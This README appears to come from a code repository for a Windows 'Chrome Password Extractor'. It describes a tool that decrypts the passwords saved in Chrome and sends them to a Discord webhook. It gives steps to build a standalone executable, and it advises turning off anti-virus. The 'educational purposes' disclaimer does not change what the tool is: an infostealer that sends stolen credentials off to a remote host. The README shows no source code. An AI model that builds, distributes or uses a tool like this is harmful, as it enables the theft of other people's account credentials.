# Chrome Password Extractor

A Python-based tool that extracts and decrypts saved passwords from Google Chrome browser on Windows systems. This project demonstrates browser security concepts and is intended for educational purposes only.

## ⚠️ Disclaimer

This tool is provided for educational and authorized security testing purposes only. Unauthorized use to access passwords without proper authorization is illegal and unethical. The developers assume no liability and are not responsible for any misuse or damage caused by this program.

## Features

- Extracts saved passwords from Google Chrome
- Supports multiple Chrome encryption methods:
  - Legacy DPAPI encryption (Chrome < v80)
  - AES-256-GCM encryption (v10/v11)
  - Modern encryption (v20) with system-level decryption
- Simple GUI interface
- Discord webhook integration for remote logging
- Works on Windows systems

## Prerequisites

- Windows operating system
- Python 3.7+
- Google Chrome installed
- Required Python packages (install via `pip install -r requirements.txt`)

## Getting Started

### Option 1: Building the Executable

If you want to create a standalone executable (`.exe`) of this application:

1. **Update the Webhook URL**
   - Open `main.py` in a text editor
   - Replace `WEBHOOK_URL = "https://discord.com/api/webhooks/..."` with your Discord webhook URL
   - Save the file

2. **Run the Build Script**
   - Double-click on `build.bat`
   - The executable will be created in the `dist` folder

### Option 2: Running Locally

If you want to run the application directly without building an executable:

1. **Update the Webhook URL**
   - Open `main.py` in a text editor
   - Replace `WEBHOOK_URL = "https://discord.com/api/webhooks/..."` with your Discord webhook URL
   - Save the file

2. **Run the Setup Script**
   - Double-click on `setup.bat`
   - This will install the required dependencies 
   - Then run `main.py` (Admin required)

### Note on Anti-Virus Detection

Be aware that password extraction tools are often flagged by anti-virus software. You may need to add an exception for the executable or temporarily disable your anti-virus during testing.

## How It Works

The tool works by:
1. Locating Chrome's SQLite database containing saved passwords
2. Extracting encrypted password data
3. Decrypting the data using Windows DPAPI and Chrome's encryption keys
4. Sending the decrypted credentials to the specified Discord webhook

## Security Notes

- This tool requires access to the user's Windows login credentials to function
- It only works when run under the same user account that was used to save the passwords in Chrome
- Modern Chrome versions (v80+) use strong encryption that requires system-level access to decrypt

## Detection & Prevention

To protect against such tools:
- Use a strong Windows password
- Enable Windows Credential Guard
- Use a password manager with a master password
- Regularly monitor your system for unauthorized applications

## License

This project is for educational purposes only. Use responsibly and only on systems you own or have explicit permission to test.

## Contributing

Contributions are welcome! Please open an issue or submit a pull request.
